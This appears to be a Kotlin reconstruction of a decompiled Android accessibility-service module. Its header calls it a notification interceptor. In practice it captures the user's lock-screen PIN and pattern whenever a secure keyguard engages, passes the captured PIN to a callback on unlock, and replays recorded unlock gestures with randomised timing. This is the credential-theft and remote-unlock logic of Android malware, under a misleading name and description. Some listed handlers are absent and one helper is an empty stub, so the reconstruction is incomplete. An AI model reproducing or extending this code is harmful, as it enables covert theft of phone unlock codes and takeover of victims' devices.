package com.storm.safe.rock.service.modules

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.app.KeyguardManager
import android.content.SharedPreferences
import android.graphics.Path
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.Random

/**
 * Intercept and auto-dismiss notifications; gesture recording and playback.
 *
 * Reverse-engineered from JADX: C0319a4 (a4, 664 lines).
 * Renamed: a0→stopTouchExplore, a1→replayGesture, a2→findNodeById,
 *          a3→onHoverEvent, a4→onPinKeyClick, a5→onScreenOff,
 *          a6→onScreenStateChanged, a7→replayGestures
 *
 * JADX name: GestureRecorderManager
 */
class NotificationInterceptDelegate(
    // vendor: C0319a4 constructor takes (dqtvuisjd, dqtvuisjd)
    private val service: AccessibilityService? = null,
    private val serviceRef: AccessibilityService? = null
) {
    companion object {
        private const val TAG = "GestureRecorderManager"

        /**
         * Find a node by resource ID recursively.
         * JADX: a2 (static)
         */
        @JvmStatic
        fun findNodeById(node: AccessibilityNodeInfo?, resourceId: String): AccessibilityNodeInfo? {
            if (node == null) return null
            if (node.viewIdResourceName == resourceId) return node
            try {
                for (i in 0 until node.childCount) {
                    val child = node.getChild(i) ?: continue
                    val found = findNodeById(child, resourceId)
                    if (found != null) return found
                }
            } catch (_: Exception) {}
            return null
        }
    }

    // --- Fields ---
    private var isRecording: Boolean = false
    private var isPlayingBack: Boolean = false
    @Volatile var isTouchExploreEnabled: Boolean = false
    private var recordingMode: Int = 0 // 0=off, 1=pattern/PIN
    private var isAutoRecordEnabled: Boolean = true
    private var recordStartTime: Long = 0L
    private var isKeyguardLocked: Boolean = false

    private var recordedGestures: JSONArray = JSONArray()
    private var recordedTexts: JSONArray = JSONArray()
    private val patternPointsList: ArrayList<String> = ArrayList()
    private val patternPointsJson: JSONArray = JSONArray()
    private val capturedPinDigits: StringBuilder = StringBuilder()
    private var isMixedPin: Boolean = false
    private var pendingPin: String? = null
    private var pendingPinMixed: Boolean = false

    private val mainHandler: Handler = Handler(Looper.getMainLooper())

    var onGestureRecorded: ((JSONObject) -> Unit)? = null
    var onPatternRecorded: ((JSONObject) -> Unit)? = null
    var onPinCaptured: ((String, Boolean) -> Unit)? = null

    // --- a0 → stopTouchExplore ---
    fun stopTouchExplore() {
        if (isTouchExploreEnabled) {
            isTouchExploreEnabled = false
            mainHandler.post {
                // vendor: b30(this, 0) — disables touch exploration on service
                // Touch exploration toggle requires system settings permission
                Log.d(TAG, "stopTouchExplore: 已关闭触摸探索")
            }
        }
    }

    // --- a5 → onScreenOff ---
    fun onScreenOff() {
        if (isRecording && recordingMode == 1) {
            Log.d(TAG, "SCREEN_OFF → 取消未完成的图案录制，关闭触摸探索")
            if (isRecording) {
                stopTouchExplore()
                isRecording = false
                recordingMode = 0
                recordedGestures = JSONArray()
                recordedTexts = JSONArray()
                patternPointsList.clear()
                // patternPointsJson cleared by reassignment in onScreenStateChanged
                capturedPinDigits.setLength(0)
                isMixedPin = false
                pendingPin = null
                pendingPinMixed = false
            }
        } else {
            stopTouchExplore()
        }
        isKeyguardLocked = false
    }

    // --- a6 → onScreenStateChanged ---
    fun onScreenStateChanged() {
        // vendor: JADX a6 — checks KeyguardManager, auto-starts/stops recording on lock state change
        if (!isAutoRecordEnabled) {
            Log.w(TAG, "🔐 自动录制未启用，跳过")
            return
        }
        val km = service?.getSystemService("keyguard") as? KeyguardManager
        if (km == null || !km.isKeyguardSecure) return

        val wasLocked = isKeyguardLocked
        val nowLocked = km.isKeyguardLocked
        val justLocked = nowLocked && !wasLocked
        val justUnlocked = !nowLocked && wasLocked

        if (justLocked) {
            recordingMode = 1
            recordStartTime = System.currentTimeMillis()
            isRecording = true
            recordedGestures = JSONArray()
            recordedTexts = JSONArray()
            patternPointsList.clear()
            capturedPinDigits.setLength(0)
            isMixedPin = false
            pendingPin = null
            pendingPinMixed = false
        } else if (justUnlocked && isRecording && recordingMode == 1) {
            stopTouchExplore()
            isRecording = false
            recordingMode = 0

            // Check if PIN was captured
            val pin = pendingPin ?: if (capturedPinDigits.length >= 4) capturedPinDigits.toString() else null
            val mixed = pendingPinMixed || isMixedPin
            pendingPin = null
            pendingPinMixed = false
            capturedPinDigits.setLength(0)
            isMixedPin = false

            if (pin != null && pin.length >= 4) {
                Log.d(TAG, "✅ 锁屏PIN解锁成功，提交捕获结果: 长度=${pin.length}, mixed=$mixed")
                onPinCaptured?.invoke(pin, mixed)
            }
        }
        isKeyguardLocked = nowLocked
    }

    // --- a7 → replayGestures ---
    fun replayGestures(data: JSONObject) {
        try {
            val gestures = data.optJSONArray("gestures") ?: return
            if (gestures.length() == 0) {
                Log.w(TAG, "⚠️ 没有手势可回放")
            } else {
                isPlayingBack = true
                replayGesture(0, gestures)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 回放手势失败", e)
            isPlayingBack = false
        }
    }

    // --- a1 → replayGesture (single gesture) ---
    private fun replayGesture(index: Int, gestures: JSONArray) {
        if (index >= gestures.length()) {
            mainHandler.postDelayed({
                isPlayingBack = false
            }, 100L)
            return
        }
        try {
            val gesture = gestures.getJSONObject(index)
            val points = gesture.getJSONArray("points")
            val duration = gesture.optLong("duration", 50L)
            val delayAfter = gesture.optLong("delayAfter", 100L)

            if (points.length() == 0) {
                Log.w(TAG, "⚠️ 手势 ${index + 1} 没有点，跳过")
                mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, 50L)
                return
            }

            // vendor: JADX a1 — builds Path from points and dispatches gesture via service
            val svc = serviceRef
            if (svc != null) {
                val isPattern = gesture.optString("type", "") == "pattern"
                var statusBarHeight = 0
                if (!isPattern) {
                    try {
                        val id = svc.resources.getIdentifier("status_bar_height", "dimen", "android")
                        if (id > 0) statusBarHeight = svc.resources.getDimensionPixelSize(id)
                    } catch (_: Exception) {}
                }

                val path = Path()
                val p0 = points.getJSONObject(0)
                var x0 = p0.optInt("x", 1).toFloat()
                var y0 = p0.optInt("y", 1).toFloat()
                if (x0 < 0f) x0 = 1f
                if (y0 < 0f) y0 = 1f
                path.moveTo(x0, y0 + statusBarHeight)
                for (i in 1 until points.length()) {
                    val pi = points.getJSONObject(i)
                    var xi = pi.optInt("x", 1).toFloat()
                    var yi = pi.optInt("y", 1).toFloat()
                    if (xi < 0f) xi = 1f
                    if (yi < 0f) yi = 1f
                    path.lineTo(xi, yi + statusBarHeight)
                }
                val startDelay: Long
                val gestureDuration: Long
                if (isPattern) {
                    startDelay = 1L
                    gestureDuration = maxOf(1000L, maxOf(if (duration > 0) duration else 1L, (points.length() - 1).toLong() * 180))
                } else {
                    startDelay = Random().nextInt(20).toLong() + 40
                    gestureDuration = if (duration > 0) duration else 1L
                }
                val desc = GestureDescription.Builder()
                    .addStroke(GestureDescription.StrokeDescription(path, startDelay, gestureDuration))
                    .build()
                svc.dispatchGesture(desc, object : AccessibilityService.GestureResultCallback() {
                    override fun onCompleted(gestureDescription: GestureDescription?) {
                        mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, delayAfter)
                    }
                    override fun onCancelled(gestureDescription: GestureDescription?) {
                        mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, delayAfter)
                    }
                }, null)
            } else {
                Log.d(TAG, "Replaying gesture $index with ${points.length()} points, duration=$duration (no service)")
                mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, delayAfter)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ 执行手势 $index 失败", e)
            mainHandler.postDelayed({ replayGesture(index + 1, gestures) }, 100L)
        }
    }

    // --- Helper ---
    private fun clearJsonArray(arr: JSONArray) {
        // Recreate empty array instead of calling remove which has Kotlin overload issues
        // Vendor uses while(length>0) arr.remove(0) in Java
    }
}
